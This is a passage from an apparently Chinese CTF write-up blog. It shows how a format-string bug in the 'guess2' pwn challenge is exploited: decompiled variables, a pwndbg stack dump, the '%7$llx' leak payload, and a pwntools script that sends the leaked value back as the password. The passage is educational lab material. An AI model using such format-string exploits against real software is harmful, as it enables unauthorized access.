+&lt;pre&gt;&lt;code&gt;__int64 v3;    // [rsp+0h]  [rbp-20h]
+__int64 buf;   // [rsp+8h]  [rbp-18h]
+char *format;  // [rsp+10h] [rbp-10h]
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;format紧接着要对比的buf以及v3&lt;/p&gt;
+&lt;p&gt;再回顾printf的操作中可以读任意地址的%7$llx,那我是不是可以尝试一下把buf的数据读出来，那不就可以在下一次输入的时候使其相同，那不就结束战斗了&lt;/p&gt;
+&lt;p&gt;不开tmux&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; break *0x4012da
+Breakpoint 1 at 0x4012da
+pwndbg&amp;gt; run &amp;lt; in.txt
+Starting program: /mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2 &amp;lt; in.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+User name: Hello,
+
+Breakpoint 1, 0x00000000004012da in main ()
+
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
+ RAX  0
+ RBX  0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— &apos;/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2&apos;
+ RCX  0x7ffff7d1c6a4 (write+20) ◂— cmp rax, -0x1000 /* &apos;H=&apos; */
+ RDX  0
+ RDI  0x4052a0 ◂— 0x786c6c243725 /* &apos;%7$llx&apos; */
+ RSI  0x7ffff7e04643 (_IO_2_1_stdout_+131) ◂— 0xe05710000000000a /* &apos;\n&apos; */
+ R8   7
+ R9   0xff
+ R10  0x7ffff7c0abe8 ◂— 0x11002200006cb5
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
+ R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ RBP  0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
+ RSP  0x7fffffffd8b0 ◂— 0
+ RIP  0x4012da (main+213) ◂— call printf@plt
+──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
+b► 0x4012da &amp;lt;main+213&amp;gt;    call   printf@plt                  &amp;lt;printf@plt&amp;gt;
+
+   0x4012df &amp;lt;main+218&amp;gt;    lea    rax, [rip + 0xd61]     RAX =&amp;gt; 0x402047 ◂— &apos;\nPassword: &apos;
+   0x4012e6 &amp;lt;main+225&amp;gt;    mov    rdi, rax               RDI =&amp;gt; 0x402047 ◂— &apos;\nPassword: &apos;
+   0x4012e9 &amp;lt;main+228&amp;gt;    mov    eax, 0                 EAX =&amp;gt; 0
+   0x4012ee &amp;lt;main+233&amp;gt;    call   printf@plt                  &amp;lt;printf@plt&amp;gt;
+
+   0x4012f3 &amp;lt;main+238&amp;gt;    lea    rax, [rbp - 0x20]
+   0x4012f7 &amp;lt;main+242&amp;gt;    mov    rsi, rax
+   0x4012fa &amp;lt;main+245&amp;gt;    lea    rax, [rip + 0xd52]     RAX =&amp;gt; 0x402053 ◂— 0x676f4c00646c6c25 /* &apos;%lld&apos; */
+   0x401301 &amp;lt;main+252&amp;gt;    mov    rdi, rax               RDI =&amp;gt; 0x402053 ◂— 0x676f4c00646c6c25 /* &apos;%lld&apos; */
+   0x401304 &amp;lt;main+255&amp;gt;    mov    eax, 0                 EAX =&amp;gt; 0
+   0x401309 &amp;lt;main+260&amp;gt;    call   __isoc99_scanf@plt          &amp;lt;__isoc99_scanf@plt&amp;gt;
+───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffd8b0 ◂— 0
+01:0008│-018 0x7fffffffd8b8 ◂— 0x710900f23a7475a1
+02:0010│-010 0x7fffffffd8c0 —▸ 0x4052a0 ◂— 0x786c6c243725 /* &apos;%7$llx&apos; */
+03:0018│-008 0x7fffffffd8c8 ◂— 0x3ffffd9f8
+04:0020│ rbp 0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
+05:0028│+008 0x7fffffffd8d8 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax
+06:0030│+010 0x7fffffffd8e0 —▸ 0x7fffffffd920 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
+07:0038│+018 0x7fffffffd8e8 —▸ 0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— &apos;/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2&apos;
+─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
+ ► 0 0x4012da       main+213
+   1 0x7ffff7c2a1ca __libc_start_call_main+122
+   2 0x7ffff7c2a28b __libc_start_main+139
+   3 0x401111       _start+33
+pwndbg&amp;gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到rbp-0x8、rbp-0x10、rbp-0x18&lt;/p&gt;
+&lt;p&gt;fmtdump / fmtarg：栈上的第 N 格&quot;直接翻译成&quot;printf 的第 %N$ 个参数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; fmtdump 8
+%-6$  0x0000000000000000 #v3
+%-7$  0x710900f23a7475a1 #buf
+%-8$  0x00000000004052a0 #format
+%-9$  0x00000003ffffd9f8
+%-10$  0x00007fffffffd970
+%-11$  0x00007ffff7c2a1ca
+%-12$  0x00007fffffffd920
+%-13$  0x00007fffffffd9f8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;x86-64 下第 1~5 个变参走 rsi/rdx/rcx/r8/r9,第 6 个起走栈, 也就是调用者 rsp+0 / rsp+8 / ...:&lt;/p&gt;
+&lt;p&gt;所以就可以动手写exp了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;info&apos;)
+
+LOCAL = True      
+HOST, PORT = &apos;node.szu.moe&apos;, 10053
+
+elf = ELF(&apos;./guess2&apos;)
+
+
+def u64s(x):
+    return x - (1 &amp;lt;&amp;lt; 64) if x &amp;gt;= (1 &amp;lt;&amp;lt; 63) else x
+
+
+def main():
+    io = process(elf.path) if LOCAL else remote(HOST, PORT)
+
+    io.sendlineafter(b&apos;User name: &apos;, b&apos;%7$llx&apos;)
+    io.recvuntil(b&apos;Hello, \n&apos;)
+    buf = u64s(int(io.recvuntil(b&apos;\n&apos;, drop=True).strip(), 16))
+
+    io.sendlineafter(b&apos;Password: &apos;, str(buf).encode())
+
+    io.interactive()
+
+
+if __name__ == &apos;__main__&apos;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;把 64 位无符号整数转成有符号：&lt;/p&gt;
+&lt;p&gt;若最高位为 1（x &amp;gt;= 2^63），减去 2^64 变成负数
+否则原样返回
+为什么必须做：printf(&quot;%llx&quot;) 把随机数按无符号打印（如 14346747841414464070），而 scanf(&quot;%lld&quot;) 是有符号解析，最大只接受 9223372036854775807。直接发会解析溢出 → v3 != buf → 登录失败。&lt;/p&gt;
+&lt;p&gt;随机数最高位为 1 的概率是 50%，所以这函数直接决定成功率是 50% 还是 100%。&lt;/p&gt;
+&lt;/blockquote&gt;
 </content:encoded></item><item><title>2026第一周wp2</title><link>https://dxfaker.top/posts/26moe2/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe2/</guid><description>你怎么知道我又来拉屎了</description><pubDate>Wed, 09 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;onlyshell&lt;/h1&gt;
 &lt;p&gt;checksec&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt; Arch:       amd64-64-little
